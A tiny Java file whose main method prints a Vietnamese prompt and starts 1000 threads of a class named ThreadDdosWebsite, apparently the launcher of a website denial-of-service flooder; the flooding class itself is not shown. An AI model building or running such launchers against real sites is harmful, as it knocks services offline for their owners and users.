
public class Main {

	public static void main(String[] args) {
		// TODO Auto-generated method stub
		System.out.println("VUi long nhap");
		
		
		Thread [] tBc = new ThreadDdosWebsite[1000];
		
		for(int i = 0; i < 1000; i++) {
			tBc[i] = new ThreadDdosWebsite();
			
			tBc[i].start();
	}
	}
}
